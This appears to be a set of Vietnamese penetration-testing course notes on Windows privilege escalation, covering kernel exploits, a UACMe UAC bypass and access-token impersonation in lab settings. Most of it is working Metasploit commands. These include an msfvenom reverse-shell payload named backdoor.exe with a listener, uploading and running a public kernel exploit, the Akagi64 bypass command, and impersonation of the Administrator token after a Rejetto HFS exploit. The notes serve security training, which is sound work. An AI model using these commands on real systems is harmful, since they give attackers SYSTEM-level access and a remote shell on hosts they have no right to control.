# Windows Privilege Escalation

Leo thang đặc quyền trên Windows

## Windows Kernal Exploit

Windows chạy kernal Windows NT

Qúa trình leo thang đặc quyền gồm 2 bước chính:

-   Xác định lỗ hổng trong Kernal (cấu hình sai)
-   Tải payload execute về máy và thực thi để có được quyền cao hơn 

Tool:

-   Windows-Exploit-Suggester : detect lỗ hổng, gợi ý lỗ hổng 

-   Windows-Kernal-Exlpoits : tập hợp các exploit theo CVE

BÀI HỌC VỀ LEO THANG ĐẶC QUYỀN SẼ BẮT ĐẦU VỚI 1 SESSION ĐÃ VÀO ĐƯỢC MÁY CHỦ (CÁC PHẦN KHAI THÁC ĐỂ VÀO ĐƯỢC CẦN XEM LẠI CÁC PHẦN TRƯỚC)

Vào MSF:

`sessions` -> liệt kê session, sau đó hãy chọn sesstion

`getuid` -> xem thông tin user 

`getprivs` -> xem các quyền được sử dụng với user hiện tại

Trong 1 số trường hợp đơn giản, có thể dùng lệnh: `getsystem` để MSF tự động leo thang, nhưng ko phải lúc nào cũng thành công


Sử dụng module để liệt kê các lỗ hổng trong kernal:

`use multi/recon/local_exploit_suggester`

`set SESSION <number>` -> đặt thành session cần khai thác

`run`

-> Nó sẽ gợi ý module có thể dùng để exploit leo thang đặc quyền

### CÁCH KHAI THÁC KHÁC: 

Vào session đặc quyền thấp: `systeminfo`

-> copy thông tin nhận được cho ra 1 file -> đặt tên `win7.txt` chẳng hạn 

`cd Windows/Enum/Windows-Exploit-Suggester`

`./windows-exploit-suggester.py --update`

`./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/<path to win7.txt> `

Kho mã khai thác public: `https://github.com/SecWiki/windows-kernel-exploits` => tải mã khai thác phù hợp `.exe`

Vào lại session ở MSF ở phân quyền thấp:

`cd Temp\\`

`upload ~/Downloads/41015.exe` -> upload file exploit lên máy 

`shell` -> bật shell trên máy victim

`.\41015.exe 7` -> đợi exploit -> check lại bằng `whoami` -> `nt authority/system` -> đã leo quyền cao nhất 


## Bypassing UAC with UACMe

### UAC là gì? 

UAC - User Account Control là 1 tính năng Windows security để ngăn chặn những thay đổi trái phép thực hiện với hệ điều hành 

![alt text](image.png)

-> Mục tiêu phần này là bypass cơ chế này để leo lên quyền cao nhất 

UAC có nhiều level từ low -> high

https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/uacme

`https://github.com/hfiref0x/UACME`

Điều kiện là ta có user như hình:

![alt text](image-1.png)

Thực hành:

Sau khi có được session 1 người dùng trên windows

`sysinfo` -> trả về `x86/windows` -> chạy 32 bit

`pgrep explorer` -> 2448

`migrate 2448`

`sysinfo` -> trả về `x64/windows`

`getuid`

`getprivs`

-> kiểm tra người dùng ko phải authority và chỉ có 1 vài quyền

`shell`

`net user` 

`net localgroup administrators`  -> xác định người dùng này là trong group administrator

Test có UAC

`net user <user hiện tại> password123`

-> trả về access is denied

Vào 1 tab khác: 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip attacker> LPORT=1234 -f exe > backdoor.exe`

Bật 1 tab mới msf để tạo port lắng nghe:

`use multi/handler`

`set payload windows/meterpeter/reverse_tcp`

`set LHOST <ip attacker>`

`set LPORT 1234`

`run`

Trở lại cửa sổ MSF 1 (có user đặc quyền thấp):

`cd C:\\`

`mkdir Temp`

`cd Temp`

`upload backdoor.exe`

`upload /root/Desktop/tools/UACME/Akagi64.exe`

`shell`

Hiện tại chúng ta sẽ ko thể chạy `backdoor.exe` vì UAC ngăn điều này

`.\Akagi64.exe 23 C:\Temp\backdoor.exe`

-> chuyển về tab lắng nghe port

`sysinfo`, `getuid` -> vẫn tài khoản cũ chưa lên được authority

`getprivs` -> đã có nhiều quyền hơn 

`ps`

`migrate <PID có quyền authority>`

`getuid` -> đã lên authority

### Lab

## Access token impersonation (mạo danh token)

### Windows Access token là gì?

Được tạo và quản lý bởi Local Security Authority Subsystem Service (LSASS)

Nó cung cấp token (hiểu đơn giản như cookie của web) cho phép vào tiến trình mà không cần user/pass

Được tạo ra bởi tiến trình winlogon.exe, sau khi người dùng đăng nhập thành công, tiến trình sẽ tạo token

Token này sẽ có cả phần để check tài nguyên nào được sử dụng

Token được phân vào các mức:

- Impersonate-level tokens: được tạo khi đăng nhập ko trực tiếp hay ko tương tác với login trên windows, mà thường thông qua các service hay domain logon

- Delegate-leve tokens: được tạo thông qua quá trình đăng nhập trực tiếp logon.exe hoặc đăng nhập qua RDP

Để tạo token mạo danh cần có các quyền (privilege) sau ở user đang chiếm được:

- SeAssignPrimaryToken: cho phép người dùng tạo ra token mạo danh

- SeCreateToken: cho phép người dùng tạo token bất kì với quyền quản trị

- SeImpersonatePrivilege: cho phép người dùng tạo 1 process trong bối cảnh bảo mật của người khác

Sử dụng Incognito Module: liệt kê các token có sẵn 

### LAB

`nmap IP`

mở port 80

vào web -> có HttpFileServer httpd 2.3 -> rejetto

mở MSF

`search rejetto`

`use exploit/windows/http/rejetto_hfs_exec`

`set RHOSTS IP`

`exploit`

-> ta có 1 phiên 

`sysinfo`

Meterpreter     : x86/windows -> ta có thể thấy meterpreter đang chạy ở x86 ta cần chuyển về x64

`pgrep explorer` -> ra 1 số PID

`migrate <PID>`

`getuid`
	Server username: NT AUTHORITY\LOCAL SERVICE
`# LOCAL SERVICE account is by default unprivileged`

`getprivs`
    SeAssignPrimaryTokenPrivilege
    SeAuditPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeImpersonatePrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeSystemtimePrivilege
    SeTimeZonePrivilege

`load incognito`

`list_tokens -u`

    Delegation Tokens Available # Interactive Logon
    ========================================
    ATTACKDEFENSE\Administrator
    NT AUTHORITY\LOCAL SERVICE

    Impersonation Tokens Available # Non-Interactive Logon
    ========================================
    No tokens available

Ở đây ta thấy có 2 token đang được tạo: 1 của admin và 1 của ta, chúng ta sẽ cần mạo danh token admin

`impersonate_token "ATTACKDEFENSE\Administrator"`

`getuid` -> đã nâng cao được đặc quyền

`getprivs`

`pgrep explorer`

`migrate <PID>`

`getprivs`

Nếu dùng `list_tokens -u` không có token nào được liệt kê thì chúng ta ko leo quyền bằng cách này được mà phải dùng đến `Potato Attack`































